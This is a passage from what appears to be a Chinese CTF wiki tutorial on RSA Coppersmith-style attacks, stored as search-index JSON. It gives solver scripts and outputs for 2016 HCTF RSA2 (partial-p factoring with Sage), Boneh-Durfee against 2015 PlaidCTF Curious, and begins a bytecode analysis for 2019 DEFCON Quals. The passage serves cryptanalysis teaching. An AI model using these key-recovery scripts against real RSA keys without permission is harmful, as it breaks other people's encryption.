) print \"e2: \" , hex ( e2 ) print \"flag: \" , hex ( enc_flag ) \u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b n : 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f e : 0x10001 e2 : 0xf93b flag : 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 \u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa p , q , e = gen_key () n = p * q phi_n = ( p - 1 ) * ( q - 1 ) d = invmod ( e , phi_n ) while True : e2 = random . randint ( 0x1000 , 0x10000 ) if gcd ( e2 , phi_n ) == 1 : break \u6211\u4eec\u5f97\u5230\u7684 n=p \\times q n=p \\times q \u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 gen_key \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b gen_key \u51fd\u6570 def gen_key (): while True : p = getPrime ( k / 2 ) if gcd ( e , p - 1 ) == 1 : break q_t = getPrime ( k / 2 ) n_t = p * q_t t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) u = pi_b ( p4 , 1 ) n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570 k=2048 e=0x10001 k=2048 e=0x10001 \u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 gcd(2,p-1)=1 \u3002 \u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 q_t q_t \uff0c\u5e76\u4e14\u8ba1\u7b97 n_t=p \\times q_t n_t=p \\times q_t \u3002 \u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 get_bit \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b def get_bit ( number , n_bit , dire ): ''' dire: 1: left 0: right ''' if dire : sn = size ( number ) if sn % 8 != 0 : sn += ( 8 - sn % 8 ) return number >> ( sn - n_bit ) else : return number & ( pow ( 2 , n_bit ) - 1 ) \u53ef\u4ee5\u770b\u51fa\u6839\u636e dire(ction) \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570 dire=1 \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 number \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 sn \uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 sn \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de number \u53f3\u79fb sn-n_bit \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 number \u7684 n_bit \u4f4d\u3002 dire=0 \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 number \u7684\u4f4e n_bit \u4f4d\u3002 \u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) \u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5 t \u4e3a n_t \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 y \u4e3a n_t \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002 p4 \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 \u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c u = pi_b ( p4 , 1 ) \u5229\u7528 pi_b \u5bf9 p4 \u8fdb\u884c\u4e86\u52a0\u5bc6 def pi_b ( x , m ): ''' m: 1: encrypt 0: decrypt ''' enc = DES . new ( key ) if m : method = enc . encrypt else : method = enc . decrypt s = long_to_bytes ( x ) sp = [ s [ a : a + 8 ] for a in xrange ( 0 , len ( s ), 8 )] r = \"\" for a in sp : r += method ( a ) return bytes_to_long ( r ) \u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002 \u4e0b\u9762 n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de q' \u3002 \u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 n'=p*q' \u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b n'=p * ( q + random(2^{k/16})) \u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 k/2+k/16=9k/16 k/2+k/16=9k/16 \u6bd4\u7279\u4f4d\u3002 \u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002 \u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b u=hex(n)[2:-1][-480:-320] \u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b if __name__ == \"__main__\" : n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f u = hex ( n )[ 2 : - 1 ][ - 480 : - 320 ] u = int ( u , 16 ) p4 = pi_b ( u , 0 ) print hex ( p4 ) \u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b \u279c 2016 - HCTF - RSA2 git :( master ) \u2717 python exp_p4 . py 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 L \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d from sage.all import * import binascii n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f p4 = 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 cipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 e2 = 0xf93b pbits = 1024 kbits = pbits - p4 . nbits () print p4 . nbits () p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) if roots : p = p4 + int ( roots [ 0 ]) print \"p: \" , hex ( int ( p )) assert n % p == 0 q = n / int ( p ) print \"q: \" , hex ( int ( q )) print gcd ( p , q ) phin = ( p - 1 ) * ( q - 1 ) print gcd ( e2 , phin ) d = inverse_mod ( e2 , phin ) flag = pow ( cipher , d , n ) flag = hex ( int ( flag ))[ 2 : - 1 ] print binascii . unhexlify ( flag ) \u5173\u4e8e small_roots \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 SAGE \u8bf4\u660e \u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016 -HCTF-RSA2 git: ( master ) \u2717 sage payload.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory 640 p: 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L q: 0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L 1 1 hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"2016 HCTF RSA2"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_13","text":"2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA 2017 WHCTF Untitled","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#boneh-and-durfee-attack","text":"","title":"Boneh and Durfee attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_14","text":"\u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 d < N^{0.292} d < N^{0.292} \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u653b\u51fb\uff0c\u6bd4 Wiener's Attack \u8981\u5f3a\u4e00\u4e9b\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_15","text":"\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406\u3002 \u9996\u5148 ed \\equiv 1 \\bmod \\varphi(N)/2 ed \\equiv 1 \\bmod \\varphi(N)/2 \u8fdb\u800c\u6709 ed +k\\varphi(N)/2=1 ed +k\\varphi(N)/2=1 \u5373 k \\varphi(N)/2 \\equiv 1 \\bmod e k \\varphi(N)/2 \\equiv 1 \\bmod e \u53c8 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \u6240\u4ee5 k(N-p-q+1)/2 \\equiv 1 \\bmod e k(N-p-q+1)/2 \\equiv 1 \\bmod e \u5047\u8bbe A=\\frac{N+1}{2} A=\\frac{N+1}{2} \uff0c y=\\frac{-p-q}{2} y=\\frac{-p-q}{2} \uff0c\u539f\u5f0f\u53ef\u5316\u4e3a f(k,y)=k(A+y) \\equiv 1 \\bmod e f(k,y)=k(A+y) \\equiv 1 \\bmod e \u5176\u4e2d |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |k|<\\frac{2ed}{\\varphi(N)}<\\frac{3ed}{N}=3*\\frac{e}{N}*d<3*\\frac{e}{N}*N^{delta} |y|<2*N^{0.5} |y|<2*N^{0.5} y \u7684\u4f30\u8ba1\u7528\u5230\u4e86 p\u3001q \u6bd4\u8f83\u5747\u5300\u7684\u5047\u8bbe\u3002\u8fd9\u91cc delta \u4e3a\u9884\u4f30\u7684\u5c0f\u4e8e 0.292 \u7684\u503c\u3002 \u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b N=pq,p+q=-2y N=pq,p+q=-2y \u6765\u5f97\u5230 p \u4e0e q\u3002 \u66f4\u52a0\u5177\u4f53\u7684\u63a8\u5bfc\uff0c\u53c2\u8003 New Results on the Cryptanalysis of Low Exponent RSA.","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_16","text":"\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002","title":"\u653b\u51fb\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2015-plaidctf-curious","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002 \u6838\u5fc3\u4ee3\u7801\u5982\u4e0b nlist = list () elist = list () clist = list () with open ( 'captured' ) as f : # read the line {N : e : c} and do nothing with it f . readline () for i in f . readlines (): ( N , e , c ) = i [ 1 : - 2 ] . split ( \" : \" ) nlist . append ( long ( N , 16 )) elist . append ( long ( e , 16 )) clist . append ( long ( c , 16 )) for i in range ( len ( nlist )): print 'index i' n = nlist [ i ] e = elist [ i ] c = clist [ i ] d = solve ( n , e ) if d == 0 : continue else : m = power_mod ( c , d , n ) hex_string = \" %x \" % m import binascii print \"the plaintext:\" , binascii . unhexlify ( hex_string ) return \u7ed3\u679c\u5982\u4e0b === solution found === private key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583 the plaintext: flag_S0Y0UKN0WW13N3R $4 TT4CK!","title":"2015 PlaidCTF Curious"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2019-defcon-quals-asrybab","text":"\u9898\u76ee\u5927\u6982\u610f\u601d\u662f\uff0c\u6211\u4eec\u63a5\u6536\u4e09\u5bf9 RSA \uff0c\u7136\u540e\u9700\u8981\u6c42\u51fa d\uff0c\u7136\u540e\u5bf9\u7ed9\u5b9a\u7684\u6570\u5b57 v[i] \u52a0\u5bc6\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u53ea\u8981\u65f6\u95f4\u5728\u4e00\u5b9a\u8303\u56f4\u5185\uff0c940s\uff0c\u5373\u53ef\u3002\u90a3\u96be\u70b9\u81ea\u7136\u5728 create_key \u51fd\u6570\u4e86\u3002 def send_challenges (): code = marshal . loads ( \"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\" . decode ( \"hex\" )) create_key = types . FunctionType ( code , globals (), \"create_key\" ) ck = create_key \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u770b\u770b\u8fd9\u4e2a\u5230\u5e95\u662f\u5728\u5e72\u5565 >>> import marshal >>> data = \"63000000000d000000070000004300000073df010000740000721d0064010064020015000000000100640200157d00006e00007401007d01007c0100640300157d02006402007d0300786f007c03006a02008300007c01006b030072a400784c007403007296007404006a05007c02008301007d04007404006a05007c02008301007d05007406007c04007c0500188301006a02008300007c0100640400146b0400724b0050714b00714b00577c04007c0500147d0300713600577c0400640500187c050064050018147d06006406007d07006407007d080078090174030072ce017404006a07007408006403007409007c01007c0700148301008302007408006403007409007c01007c070014830100640500178302008302007d09007871007c09006a02008300007c01007c0800146b0000727b016402007d0a007844007404006a0a007c0a00830100736d017404006a0700740800640300640800830200740800640300640800830200740800640300640900830200178302007d0a00712a01577c09007c0a00397d0900710b01577404006a0b007c09007c06008302006405006b0300729a0171c6006e00007404006a0c007c09007c06008302007d0b007404006a0b007c0b007c06008302006405006b030072ca0171c6006e00005071c60057640a007d0c007c03007c0b0066020053280b0000004e690700000069000000006902000000675839b4c876bedf3f6901000000674e62105839b4d03f678d976e1283c0d23f692d000000690c0000006903000000280d000000740500000046616c736574050000004e53495a45740a0000006269745f6c656e67746874040000005472756574060000006e756d626572740e0000006765745374726f6e675072696d657403000000616273740e00000067657452616e646f6d52616e67657403000000706f777403000000696e74740700000069735072696d6574030000004743447407000000696e7665727365280d00000074010000007874050000004e73697a657406000000707173697a6574010000004e740100000070740100000071740300000070686974060000006c696d69743174060000006c696d697432740100000064740300000070707074010000006574030000007a7a7a2800000000280000000073150000002f6f726967696e616c6368616c6c656e67652e7079740a0000006372656174655f6b657917000000733e000000000106010a010d0206010a010601150109010f010f04200108010e0112020601060109013c0119010601120135020e011801060112011801060105020604\" >>> code = marshal . loads ( data ) >>> code = marshal . loads ( data . decode ( 'hex' )) >>> import dis >>> dis . dis ( code ) 24 0 LOAD_GLOBAL 0 ( False ) 3 POP_JUMP_IF_FALSE 29 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE ... 56 428 LOAD_GLOBAL 4 ( number ) 431 LOAD_ATTR 11 ( GCD ) 434 LOAD_FAST 11 ( e ) 437 LOAD_FAST 6 ( phi ) 440 CALL_FUNCTION 2 443 LOAD_CONST 5 ( 1 ) 446 COMPARE_OP 3 ( != ) 449 POP_JUMP_IF_FALSE 458 ... \u57fa\u672c\u53ef\u4ee5\u731c\u51fa\u6765\u8fd9\u662f\u5728\u751f\u6210 n\uff0ce\uff0cd\uff0c\u5176\u5b9e\u548c\u6211\u4eec\u6700\u521d\u7684\u9884\u671f\u4e5f\u5dee\u4e0d\u591a\u3002\u6211\u4eec\u6765\u76f4\u63a5\u53cd\u7f16\u8bd1\u4e00\u4e0b >>> from uncompyle6 import code_deparse >>> code_deparse ( code ) Instruction context : 25 6 LOAD_CONST 1 7 9 LOAD_CONST 2 0 12 BINARY_DIVIDE -> 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\" , line 2310 , in code_deparse deparsed . ast = deparsed . build_ast ( tokens , customize , isTopLevel = isTopLevel ) File \"/usr/local/lib/python2.7/site-packages/uncompyle6/semantics/pysource.py\" , line 2244 , in build_ast raise ParserError ( e , tokens ) uncompyle6 . semantics . parser_error . ParserError : --- This code section failed : --- ... 64 469 LOAD_FAST 3 'N' 472 LOAD_FAST 11 'e' 475 BUILD_TUPLE_2 2 None 478 RETURN_VALUE - 1 RETURN_LAST Parse error at or near ` STOP_CODE ' instruction at offset 13 \u53ef\u4ee5\u53d1\u73b0 STOP_CODE\uff0c\u6709\u70b9\u732b\u817b\uff0c\u5982\u679c\u4ed4\u7ec6\u770b\u6700\u521d\u7684\u53cd\u6c47\u7f16\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6700\u524d\u9762\u7684\u90a3\u90e8\u5206\u4ee3\u7801\u662f\u5728\u6df7\u6dc6 >>> dis . dis ( code ) 24 0 LOAD_GLOBAL 0 ( False ) 3 POP_JUMP_IF_FALSE 29 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE 26 16 STOP_CODE 17 POP_TOP 18 STOP_CODE 19 LOAD_CONST 2 ( 0 ) 22 BINARY_DIVIDE 23 STORE_FAST 0 ( x ) 26 JUMP_FORWARD 0 ( to 29 ) 28 >> 29 LOAD_GLOBAL 1 ( NSIZE ) 32 STORE_FAST 1 ( Nsize ) 29 35 LOAD_FAST 1 ( Nsize ) 38 LOAD_CONST 3 ( 2 ) 41 BINARY_DIVIDE 42 STORE_FAST 2 ( pqsize ) \u4e00\u76f4\u5230 29 35 LOAD_FAST 1 ( Nsize ) \u524d\u9762\u7684\u90fd\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u611f\u89c9\u662f\u51fa\u9898\u8005\u6545\u610f\u4fee\u6539\u4e86\u4ee3\u7801\u3002\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u611f\u89c9\u50cf\u662f\u4e24\u90e8\u5206 # part 1 25 6 LOAD_CONST 1 ( 7 ) 9 LOAD_CONST 2 ( 0 ) 12 BINARY_DIVIDE 13 STOP_CODE 14 STOP_CODE 15 STOP_CODE # part 2 26 16 STOP_CODE 17 POP_TOP 18 STOP_CODE 19 LOAD_CONST 2 ( 0 ) 22 BINARY_DIVIDE 23 STORE_FAST 0 ( x ) 26 JUMP_FORWARD 0 ( to 29 ) \u6b63\u597d\u662f\u7b2c 25 \u884c\u548c\u7b2c 26 \u884c\uff0c\u5927\u6982\u731c\u4e00\u731c\uff0c\u611f\u89c9\u4e24\u4e2a\u90fd\u662f x=7/0\uff0c\u6240\u4ee5\u5c31\u60f3\u529e\u6cd5\u628a\u8fd9\u90e8\u5206\u7684\u4ee3\u7801\u4fee\u590d\u4e00\u4e0b\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5b9a\u4f4d\u8fd9\u90e8\u5206\u4ee3\u7801\u4e86\u3002\u6839\u636e\u624b\u518c\u53ef\u4ee5\u77e5\u9053 STOP_CODE \u662f 0\uff0c\u4ece\u800c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4f4d\u7b2c 25 \u884c\u8bed\u53e5\u5230 26 \u884c\u8bed\u53e5\u4e3a t[6:26]\uff0c\u4ed6\u4eec\u5206\u522b\u90fd\u662f 10 \u5b57\u8282(6-15,16-25)\u3002 >>> t = code . co_code >>> t 't \\x00\\x00 r \\x1d\\x00 d \\x01\\x00 d 